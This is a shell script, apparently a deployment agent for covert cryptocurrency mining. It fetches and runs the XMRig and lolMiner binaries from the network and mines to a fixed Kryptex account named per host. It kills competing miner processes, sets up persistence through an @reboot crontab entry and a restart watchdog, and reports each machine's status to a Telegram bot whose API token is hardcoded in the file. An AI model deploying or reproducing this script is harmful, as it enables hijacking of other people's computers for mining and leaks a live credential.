#!/bin/sh
set -u

#################################################
# MINING AGENT — CPU + GPU (KRYPTEX)
# TELEMETRY → TELEGRAM
#################################################

[ "${ALLOW_MINING:-0}" = "1" ] || exit 0

HOST="$(hostname)"
INTERVAL=30

# ===== ACCOUNTS =====
KRIPTEX="krxX3PVQVR"

# ===== POOLS =====
XMR_POOL="xmr.kryptex.network:7029"
ETC_POOL="etc.kryptex.network:7033"

# ===== TELEGRAM =====
TG_TOKEN="5542234668:AAFO7fjjd0w7q7j-lUaYAY9u_dIAIldzhg0"
TG_CHAT="5336452267"
TG_API="https://api.telegram.org/bot${TG_TOKEN}/sendMessage"

tg() {
  curl -s --connect-timeout 10 \
    -X POST "$TG_API" \
    -d chat_id="$TG_CHAT" \
    --data-urlencode text="$1" >/dev/null 2>&1 || true
}

# ===== PATHS =====
BASE="$HOME/.mining"
BIN="$BASE/bin"
RUN="$BASE/run"
LOG="$BASE/log"

mkdir -p "$BIN/cpu" "$BIN/gpu" "$RUN" "$LOG" >/dev/null 2>&1

tg "🚀 [$HOST] Старт установки майнинга"

#################################################
# INSTALLERS (REAL CHECKS + FALLBACK)
#################################################

install_xmrig() {
  tg "📦 [$HOST] Установка XMRig"

  pkill xmrig 2>/dev/null || true
  rm -f "$BIN/cpu/xmrig"

  for URL in \
    "https://xmrig.com/download/xmrig-6.25.0-linux-static-x64.tar.gz" \
    "https://github.com/xmrig/xmrig/releases/download/v6.25.0/xmrig-6.25.0-linux-static-x64.tar.gz"
  do
    wget -q "$URL" -O /tmp/xmrig.tgz || continue
    tar -xzf /tmp/xmrig.tgz -C "$BIN/cpu" --strip-components=1 || continue
    chmod +x "$BIN/cpu/xmrig"

    if [ -x "$BIN/cpu/xmrig" ]; then
      tg "✅ [$HOST] XMRig установлен"
      return 0
    fi
  done

  tg "❌ [$HOST] XMRig НЕ УСТАНОВЛЕН (wget/tar/network)"
  return 1
}

install_lolminer() {
  tg "📦 [$HOST] Установка lolMiner"

  pkill lolMiner 2>/dev/null || true
  rm -f "$BIN/gpu/lolMiner"

  for URL in \
    "https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.98a/lolMiner_v1.98a_Lin64.tar.gz"
  do
    wget -q "$URL" -O /tmp/lolminer.tgz || continue
    tar -xzf /tmp/lolminer.tgz -C "$BIN/gpu" --strip-components=1 || continue
    chmod +x "$BIN/gpu/lolMiner"

    if [ -x "$BIN/gpu/lolMiner" ]; then
      tg "✅ [$HOST] lolMiner установлен"
      return 0
    fi
  done

  tg "❌ [$HOST] lolMiner НЕ УСТАНОВЛЕН (wget/tar/network)"
  return 1
}

#################################################
# CPU (XMRig)
#################################################

start_cpu() {
  pkill xmrig 2>/dev/null || true
  "$BIN/cpu/xmrig" \
    -o "$XMR_POOL" \
    -u "$KRIPTEX.$HOST" -p x \
    --http-enabled --http-host 127.0.0.1 --http-port 16000 \
    >> "$LOG/cpu.log" 2>&1 &
  echo $! > "$RUN/cpu.pid"
}

#################################################
# GPU (lolMiner)
#################################################

start_gpu() {
  pkill lolMiner 2>/dev/null || true
  "$BIN/gpu/lolMiner" \
    --algo ETCHASH \
    --pool "$ETC_POOL" \
    --user "$KRIPTEX.$HOST" \
    --ethstratum ETCPROXY \
    --apihost 127.0.0.1 --apiport 8080 \
    >> "$LOG/gpu.log" 2>&1 &
  echo $! > "$RUN/gpu.pid"
}

#################################################
# HASHRATE
#################################################

get_cpu_hr() {
  curl -s --max-time 2 http://127.0.0.1:16000/1/summary \
    | grep -oE '"total":\[[^]]+' \
    | grep -oE '[0-9]+' \
    | head -1 || echo 0
}

get_gpu_hr() {
  curl -s --max-time 2 http://127.0.0.1:8080/summary \
    | grep -oE '"Performance":[ ]*[0-9]+(\.[0-9]+)?' \
    | grep -oE '[0-9]+(\.[0-9]+)?' || echo 0
}

#################################################
# AUTOSTART
#################################################

ensure_autostart() {
  crontab -l 2>/dev/null | grep -q min1.sh && return
  (crontab -l 2>/dev/null; echo "@reboot ALLOW_MINING=1 $BASE/min1.sh") | crontab -
}

#################################################
# MAIN
#################################################

CPU_OK=0
GPU_OK=0

install_xmrig && CPU_OK=1
install_lolminer && GPU_OK=1

ensure_autostart

[ "$CPU_OK" = "1" ] && start_cpu || tg "❌ [$HOST] CPU майнинг НЕ ЗАПУСТИЛСЯ"
[ "$GPU_OK" = "1" ] && start_gpu || tg "❌ [$HOST] GPU майнинг НЕ ЗАПУСТИЛСЯ"

if [ "$CPU_OK" = "1" ] || [ "$GPU_OK" = "1" ]; then
  tg "✅ [$HOST] Майнинг запущен (CPU=$CPU_OK GPU=$GPU_OK)"
else
  tg "❌ [$HOST] Майнинг НЕ ЗАПУСТИЛСЯ ВООБЩЕ"
fi

#################################################
# WATCHDOG LOOP
#################################################

while true; do
  [ -f "$RUN/cpu.pid" ] || { [ "$CPU_OK" = "1" ] && start_cpu && tg "♻️ [$HOST] CPU рестарт"; }
  [ -f "$RUN/gpu.pid" ] || { [ "$GPU_OK" = "1" ] && start_gpu && tg "♻️ [$HOST] GPU рестарт"; }

  GPU_HR="$(get_gpu_hr | sed 's/\..*//')"
  if [ -n "$GPU_HR" ] && [ "$GPU_HR" -eq 0 ] && [ "$GPU_OK" = "1" ]; then
    start_gpu
    tg "⚠️ [$HOST] GPU HR=0 → рестарт"
  fi

  sleep "$INTERVAL"
done
